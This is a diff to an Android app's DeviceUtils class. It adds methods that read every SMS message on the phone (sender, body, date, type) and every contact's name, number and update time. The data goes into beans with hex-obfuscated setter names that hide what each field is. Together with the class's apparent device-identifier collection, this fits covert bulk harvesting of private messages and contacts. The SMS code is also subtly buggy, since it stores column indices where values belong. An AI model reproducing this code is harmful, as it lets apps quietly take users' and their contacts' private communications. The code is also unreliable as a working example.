@@ -1,9 +1,11 @@
 package com.dream.bjst.utils;
 
 import android.Manifest;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.database.sqlite.SQLiteException;
 import android.net.Uri;
 import android.net.wifi.ScanResult;
 import android.net.wifi.WifiInfo;
@@ -12,6 +14,7 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.StatFs;
 import android.os.SystemClock;
+import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.CellInfo;
@@ -27,12 +30,13 @@ import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Log;
 
-import androidx.annotation.RequiresApi;
 import androidx.core.app.ActivityCompat;
 
 import com.blankj.utilcode.util.GsonUtils;
 import com.blankj.utilcode.util.Utils;
+import com.dream.bjst.bean.ContactsBean;
 import com.dream.bjst.bean.PhotoInfoBean;
+import com.dream.bjst.bean.SMSInfoBean;
 import com.google.android.gms.ads.identifier.AdvertisingIdClient;
 import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
 import com.tcl.base.kt.StringExtKt;
@@ -49,7 +53,9 @@ import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
 import java.security.MessageDigest;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.Enumeration;
 import java.util.List;
 import java.util.Locale;
@@ -891,5 +897,75 @@ public class DeviceUtils {
         long blockSize = statFs.getBlockSizeLong();
         long availableBlocks = statFs.getAvailableBlocksLong();
         return blockSize * availableBlocks;
+    }
+
+    public static List<SMSInfoBean> getSmsInPhone() {
+        final String SMS_URI_ALL = "content://sms/";
+        final String SMS_URI_INBOX = "content://sms/inbox";
+        final String SMS_URI_SEND = "content://sms/sent";
+        final String SMS_URI_DRAFT = "content://sms/draft";
+        StringBuilder smsBuilder = new StringBuilder();
+        List<SMSInfoBean> smsList = new ArrayList<>();
+        try {
+            ContentResolver cr = Utils.getApp().getContentResolver();
+            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type", "read", "status"};
+            Uri uri = Uri.parse(SMS_URI_ALL);
+            Cursor cur = cr.query(uri, projection, null, null, "date desc");
+            if (cur != null && cur.moveToFirst()) {
+                String name;
+                String phoneNumber;
+                String smsbody;
+                String date;
+                int nameColumn = cur.getColumnIndex("person");
+                int phoneNumberColumn = cur.getColumnIndex("address");
+                int smsbodyColumn = cur.getColumnIndex("body");
+                int dateColumn = cur.getColumnIndex("date");
+                int typeColumn = cur.getColumnIndex("type");
+                int readColumn = cur.getColumnIndex("read");
+                int statusColumn = cur.getColumnIndex("status");
+                do {
+                    name = cur.getString(nameColumn);
+                    phoneNumber = cur.getString(phoneNumberColumn);
+                    smsbody = cur.getString(smsbodyColumn);
+                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
+                    Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
+                    date = dateFormat.format(d);
+                    int typeId = cur.getInt(typeColumn);
+                    SMSInfoBean smsInfoBean = new SMSInfoBean();
+                    smsInfoBean.set808D8491(typeId);
+                    smsInfoBean.set849C9B9A91(phoneNumber);
+                    smsInfoBean.set969B908D(smsbody);
+                    smsInfoBean.set86919590(readColumn);
+                    smsInfoBean.set8791919A(readColumn);
+                    smsInfoBean.set878095808187(statusColumn);
+                    smsInfoBean.set95909086918787(name);
+                    smsInfoBean.set87919A90BB86909186A69197919D8291A09D9991(date);
+                    smsList.add(smsInfoBean);
+                } while (cur.moveToNext());
+            }
+        } catch (SQLiteException ex) {
+            Log.d("SQLiteException", ex.getMessage());
+        }
+        return smsList;
+    }
+
+    //获取所有联系人
+    public static List<ContactsBean> getContacts() {
+        List<ContactsBean> contacts = new ArrayList<>();
+        ContentResolver cr = Utils.getApp().getContentResolver();
+        //联系人提供者的uri
+        Uri phoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
+        String num = ContactsContract.CommonDataKinds.Phone.NUMBER;
+        String name = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME;
+        String updatedTimestamp = ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP;
+        Cursor cursor = cr.query(phoneUri, new String[]{num, name,updatedTimestamp}, null, null, null);
+        while (cursor.moveToNext()) {
+            ContactsBean phoneDto = new ContactsBean();
+            phoneDto.set879B81869791(cursor.getString(cursor.getColumnIndex(name)));
+            phoneDto.set849C9B9A91(cursor.getString(cursor.getColumnIndex(num)));
+            phoneDto.set818490958091A09D9991(cursor.getString(cursor.getColumnIndex(updatedTimestamp)));
+            contacts.add(phoneDto);
+        }
+        return contacts;
     }
 }
